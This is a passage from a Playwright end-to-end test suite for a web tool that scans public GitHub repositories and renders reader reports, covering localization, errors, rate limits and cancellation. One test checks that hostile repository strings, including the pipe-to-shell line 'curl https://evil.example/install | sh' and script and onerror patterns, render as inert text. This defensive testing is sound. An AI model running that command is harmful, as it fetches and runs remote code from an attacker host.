  await page.getByRole("button", { name: "简体中文" }).click();
  await expectReaderStructure(page, "zh");
  await expect(
    readmeRegion(page, "orientation").getByText(FICTION_OVERVIEW, {
      exact: true,
    }),
  ).toBeVisible();
  await expect(reportView).toHaveAttribute(
    "data-e2e-report-identity",
    "fiction-workbench",
  );
  expect(page.url()).toBe(beforeToggle.url);
  await expect(page.locator("time")).toHaveAttribute(
    "datetime",
    beforeToggle.analyzedAt ?? "",
  );
  expect(ledger.restGets()).toHaveLength(beforeToggle.rest);
  expect(ledger.rawGets()).toHaveLength(beforeToggle.raw);
  expect(await workerConstructionCount(page)).toBe(
    beforeToggle.workerConstructions,
  );
  await page.getByRole("button", { name: "English" }).click();
  await expectReaderStructure(page, "en");

  const appendix = await openTechnicalAppendix(page);
  await expect(appendix.getByText("Dimension scores")).toBeVisible();
  await expect(appendix.getByText(/VERSIONED METHOD · 1\.0\.0/u)).toBeVisible();
  await expect(
    appendix.getByRole("button", { name: "Refresh public data" }),
  ).toHaveCount(1);
  await appendix.locator(":scope > summary").click();
  await expectAppendixClosed(page);
  await expect(reportView).toHaveAttribute(
    "data-e2e-report-identity",
    "fiction-workbench",
  );
  expect(page.url()).toBe(beforeToggle.url);
  await expect(page.locator("time")).toHaveAttribute(
    "datetime",
    beforeToggle.analyzedAt ?? "",
  );
  expect(await readerSection(page, "decision-summary").textContent()).toBe(
    beforeToggle.decision,
  );
  expect(ledger.restGets()).toHaveLength(beforeToggle.rest);
  expect(ledger.rawGets()).toHaveLength(beforeToggle.raw);
  expect(await workerConstructionCount(page)).toBe(
    beforeToggle.workerConstructions,
  );
  await expect(
    page.getByRole("heading", { name: "Repository scan in progress" }),
  ).toHaveCount(0);
  await expectNoSeriousAxeViolations(page);
  await captureStableScreenshot(
    page,
    testInfo.outputPath("fiction-workbench-reader-report.png"),
  );
  expectAnalyzerChunks(ledger, { jsTs: true, python: false });
  await runtime.assertClean();
});

test("archived stale evidence requires verification and stays factual", async ({
  context,
  page,
}, testInfo) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, {
    kind: "archived-stale",
  });
  await gotoLanding(page);
  await submitRepository(page);
  await expectReport(page);
  await expectBoundedRequests(ledger);
  await expectReaderStructure(page, "en");
  await expect(
    readerSection(page, "decision-summary").getByText(
      "Key gaps require verification before use",
      { exact: true },
    ),
  ).toBeVisible();
  const maintenance = readerSection(page, "maintenance-alternatives");
  await expect(maintenance).toContainText(/Archived\s*Yes/u);
  await expect(maintenance).toContainText("over 365 days");
  const decision = readerSection(page, "decision-summary");
  await expect(decision).toContainText(
    "Is the last supported release compatible with the intended platform?",
  );
  await expect(decision).toContainText(
    "Which data leaves the local environment at runtime?",
  );
  await expectAppendixClosed(page);
  await captureStableScreenshot(
    page,
    testInfo.outputPath("archived-stale-reader-report.png"),
  );
  expectAnalyzerChunks(ledger, { jsTs: true, python: false });
  await runtime.assertClean();
});

test("complete Python report loads only the Python deep analyzer", async ({
  context,
  page,
}) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, { kind: "python" });
  await gotoLanding(page);
  await submitRepository(page);
  await expectReport(page);
  await expectBoundedRequests(ledger);
  await expectReaderStructure(page, "en");
  const orientation = readmeRegion(page, "orientation");
  await expect(
    orientation.getByText(FIXTURE_DESCRIPTION, { exact: true }),
  ).toBeVisible();
  await expect(
    orientation.getByText(PYTHON_PURPOSE, { exact: true }),
  ).toBeVisible();
  await expect(
    orientation
      .getByRole("link", {
        name: "README.md at inspected commit",
      })
      .first(),
  ).toHaveAttribute(
    "href",
    `https://github.com/owner/repo/blob/${COMMIT_SHA}/README.md`,
  );
  await expectAppendixClosed(page);
  const appendix = await openTechnicalAppendix(page);
  await expect(
    appendix.locator(".technical-overview__score strong"),
  ).toHaveText("66 / 100");
  expect(await dimensionScores(page)).toEqual(PYTHON_SCORES);
  await expect(page.locator("time")).toHaveAttribute("datetime", FIXED_NOW);
  expectAnalyzerChunks(ledger, { jsTs: false, python: true });
  await expect(
    page.locator(".dimension-score__header strong", {
      hasText: "Unavailable",
    }),
  ).toHaveCount(0);
  await runtime.assertClean();
});

test("unsupported Go keeps its reader report and general-only appendix", async ({
  context,
  page,
}) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, { kind: "go" });
  await gotoLanding(page);
  await submitRepository(page);
  await expectReport(page);
  await expectBoundedRequests(ledger);
  await expectReaderStructure(page, "en");
  const orientation = readmeRegion(page, "orientation");
  await expect(
    orientation.getByText(FIXTURE_DESCRIPTION, { exact: true }),
  ).toBeVisible();
  await expect(
    orientation.getByText(GO_PURPOSE, { exact: true }),
  ).toBeVisible();
  await expectAppendixClosed(page);
  const appendix = await openTechnicalAppendix(page);
  await expect(
    appendix.getByText("General-only", { exact: true }),
  ).toBeVisible();
  await expect(
    appendix.getByText("Preliminary", { exact: true }),
  ).toBeVisible();
  await expect(appendix.getByText("Unavailable", { exact: true })).toHaveCount(
    2,
  );
  const confidence = await appendix
    .locator(".technical-overview__metadata > div")
    .first()
    .textContent();
  const confidencePercent = /(?<percent>\d+)%/u.exec(confidence ?? "")?.groups
    ?.percent;
  expect(Number(confidencePercent ?? 101)).toBeLessThanOrEqual(60);
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  await runtime.assertClean();
});

test("minimal evidence leads with an honest insufficient-evidence report", async ({
  context,
  page,
}) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, { kind: "minimal" });
  await gotoLanding(page);
  await submitRepository(page);
  await expectReport(page);
  await expectBoundedRequests(ledger);
  await expectReaderStructure(page, "en");
  const decision = readerSection(page, "decision-summary");
  await expect(
    readmeRegion(page, "orientation").getByText(
      "Public repository evidence is insufficient to explain this project reliably.",
      { exact: true },
    ),
  ).toBeVisible();
  await expect(page.locator(".readme-interpretation")).toHaveAttribute(
    "data-readme-availability",
    "unavailable",
  );
  await expect(
    page.getByText("No README interpretation is available.", { exact: true }),
  ).toBeVisible();
  await expect(
    decision.getByText("Public evidence is insufficient to judge", {
      exact: true,
    }),
  ).toBeVisible();
  await expect(
    readerSection(page, "architecture").getByText(
      "Repository does not provide this evidence.",
      { exact: true },
    ),
  ).toHaveCount(1);
  await expectAppendixClosed(page);
  const appendix = await openTechnicalAppendix(page);
  await expect(
    appendix.getByText("General-only", { exact: true }),
  ).toBeVisible();
  await expect(
    appendix.getByText("Preliminary", { exact: true }),
  ).toBeVisible();
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  await runtime.assertClean();
});

test("truncated trees expose partial reader sections and technical scope", async ({
  context,
  page,
}) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, {
    kind: "partial",
    failRawPath: "README.md",
  });
  await gotoLanding(page);
  await submitRepository(page);
  await expectReport(page);
  await expectBoundedRequests(ledger);
  await expectReaderStructure(page, "en");
  await expect(page.locator(".readme-interpretation")).toHaveAttribute(
    "data-readme-availability",
    "partial",
  );
  await expect(
    page.getByText(
      "README interpretation is partial; scan coverage may explain omissions.",
      { exact: true },
    ),
  ).toBeVisible();
  const partialSections = page.locator('[data-reader-availability="partial"]');
  await expect(partialSections).toHaveCount(5);
  for (let index = 0; index < 5; index += 1) {
    await expect(
      partialSections
        .nth(index)
        .locator(":scope > .reader-report__availability"),
    ).toHaveText("Not established from the scanned public evidence.");
  }
  await expectAppendixClosed(page);
  const appendix = await openTechnicalAppendix(page);
  await expect(
    appendix.getByText("Partial GitHub tree", { exact: true }),
  ).toBeVisible();
  const confidence = await appendix
    .locator(".technical-overview__metadata > div")
    .first()
    .textContent();
  const confidencePercent = /(?<percent>\d+)%/u.exec(confidence ?? "")?.groups
    ?.percent;
  expect(Number(confidencePercent ?? 101)).toBeLessThan(80);
  await expect(appendix.locator(".technical-overview__scope")).toContainText(
    /selected.*fetched.*parsed/u,
  );
  expectAnalyzerChunks(ledger, { jsTs: true, python: false });
  await runtime.assertClean();
});

test("invalid input and not-found errors are specific without speculation", async ({
  context,
  page,
}) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, {
    kind: "not-found",
  });
  await gotoLanding(page);
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  await page
    .getByLabel("Public GitHub repository URL")
    .fill("https://gitlab.com/owner/repo");
  await page.getByRole("button", { name: "Analyze repository" }).click();
  await expect(page.getByRole("alert")).toContainText(
    "Enter a public GitHub repository URL",
  );
  await submitRepository(page);
  const error = page
    .getByRole("heading", { name: "Analysis could not be completed" })
    .locator("..");
  await expect(error).toContainText("not found or is not public");
  await expect(error).not.toContainText(/private|deleted/u);
  expect(ledger.restGets()).toHaveLength(1);
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  await ledger.assertComplete({ rest: 1, raw: 0 });
  await runtime.assertClean();
});

test("rate limits show a fixed localized reset and safe official link", async ({
  context,
  page,
}) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, {
    kind: "rate-limit",
  });
  await gotoLanding(page);
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  await submitRepository(page);
  const error = page.getByRole("alert");
  await expect(error).toContainText(
    "GitHub's public API rate limit has been reached",
  );
  await expect(error).toContainText(/2026/u);
  await expect(
    error.getByRole("link", { name: "GitHub rate-limit documentation" }),
  ).toHaveAttribute("href", GITHUB_RATE_LIMIT_DOCS);
  await expect(error).toContainText(
    "GitHub rate limit resets at Aug 11, 2026, 01:00:00 PM UTC.",
  );
  expect(ledger.restGets()).toHaveLength(1);
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  await ledger.assertComplete({ rest: 1, raw: 0 });
  await runtime.assertClean();
});

test("hostile repository strings stay inert text", async ({
  context,
  page,
}) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, { kind: "hostile" });
  await gotoLanding(page);
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  await submitRepository(page);
  await expectReport(page);
  await expectReaderStructure(page, "en");
  const orientation = readmeRegion(page, "orientation");
  await expect(
    orientation.getByText(HOSTILE_DESCRIPTION_PURPOSE, { exact: true }),
  ).toBeVisible();
  await expect(
    orientation.getByText(HOSTILE_README_PURPOSE, { exact: true }),
  ).toBeVisible();
  for (const inertText of [
    HOSTILE_DESCRIPTION_PURPOSE,
    HOSTILE_README_PURPOSE,
  ]) {
    expect(
      await orientation
        .getByText(inertText, { exact: true })
        .evaluate((node) => node.closest("a") === null),
    ).toBe(true);
  }
  await expect(orientation).not.toContainText(
    /evil\.example|onerror|<script/iu,
  );
  const readerEvidence = page.locator(
    "[data-readme-region], [data-reader-section]",
  );
  await expect(
    readerEvidence.locator(
      'a[href*="evil.example"], a[href^="custom:"], a[href^="//"], a[href*="www."]',
    ),
  ).toHaveCount(0);
  await expect(
    readerEvidence.locator(
      "script[src], img[src], iframe[src], object[data], embed[src], link[href], audio[src], video[src], source[src], svg use[href], svg use[xlink\\:href], form[action]",
    ),
  ).toHaveCount(0);
  await expect(page.locator("[onerror], [onload], [onclick]")).toHaveCount(0);

  const controlledAlternative = readerSection(
    page,
    "maintenance-alternatives",
  ).getByRole("link", {
    name: "Search GitHub repositories using these evidence terms",
  });
  const controlledAlternativeHref =
    await controlledAlternative.getAttribute("href");
  expect(controlledAlternativeHref).toBe(
    "https://github.com/search?q=topic%3Aapplication&type=repositories",
  );
  await expect(controlledAlternative).toHaveAttribute(
    "rel",
    "noopener noreferrer",
  );
  const evidenceAnchors = readerEvidence.locator("a[href]");
  for (let index = 0; index < (await evidenceAnchors.count()); index += 1) {
    const anchor = evidenceAnchors.nth(index);
    const href = await anchor.getAttribute("href");
    expect(href).not.toBeNull();
    if (href === controlledAlternativeHref) continue;
    await expect(anchor).toHaveClass(/reader-report__source/u);
    expect(href).toMatch(
      new RegExp(
        `^https://github\\.com/owner/repo/(?:blob|tree)/${COMMIT_SHA}/[^?#]+(?:#L\\d+(?:-L\\d+)?)?$`,
        "u",
      ),
    );
    await expect(anchor).toHaveAttribute("rel", "noopener noreferrer");
  }
  const hostileCommand = page.locator('[data-command-kind="develop"]');
  const hostileCode = hostileCommand.locator("code");
  await expect(hostileCode).toHaveText(
    "curl https://evil.example/install | sh",
  );
  expect(
    await hostileCode.evaluate((node) => node.closest("a, button") === null),
  ).toBe(true);
  await expect(hostileCommand).toContainText(
    "Repository-provided command — review before running.",
  );
  await expectAppendixClosed(page);
  expectAnalyzerChunks(ledger, { jsTs: true, python: false });
  await expectBoundedRequests(ledger);
  await runtime.assertClean();
});

test("cancellation yields to a newer run and failed refresh preserves its report", async ({
  context,
  page,
}) => {
  const runtime = await monitorRuntime(context, page);
  const ledger = await installGitHubRoutes(context, page, {
    blockFirstRest: true,
    failRestAttempt: 5,
  });
  await gotoLanding(page);
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  await submitRepository(page);
  await expect(
    page.getByRole("button", { name: "Cancel analysis" }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Cancel analysis" }).click();
  expectAnalyzerChunks(ledger, { jsTs: false, python: false });
  ledger.releaseFirstRest();
  await submitRepository(page);
  await expectReport(page);
  await expectAppendixClosed(page);
  const appendix = await openTechnicalAppendix(page);
  await appendix.getByRole("button", { name: "Refresh public data" }).click();
  await expect(
    page.getByRole("heading", { name: "Analysis could not be completed" }),
  ).toBeVisible();
  await expectReport(page);
  await expect(
    page.getByText(/Refresh failed\. Showing the report from/u),
  ).toBeVisible();
  expect(ledger.restGets()).toHaveLength(5);
  expectAnalyzerChunks(ledger, { jsTs: true, python: false });
  await ledger.assertComplete({ rest: 5, raw: 8 });
  await runtime.assertClean();
});
